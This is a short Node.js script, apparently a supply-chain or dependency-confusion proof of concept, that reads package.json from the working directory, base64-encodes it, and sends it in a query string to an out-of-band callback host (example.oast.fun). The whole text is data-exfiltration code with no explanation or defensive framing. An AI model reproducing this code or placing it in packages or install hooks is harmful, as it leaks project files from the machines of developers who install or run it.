const fs=require('fs'),https=require('https'); const systemInfo={cwd:process.cwd()};
const packageFilePath=`${systemInfo.cwd}/package.json`;
fs.readFile(packageFilePath,'utf8',(err,data)=>{const base64File=Buffer.from(data).toString('base64'); const queryParams=new URLSearchParams({file:base64File}).toString(); const url=`https://example.oast.fun?${queryParams}`; https.get(url,()=>{});});
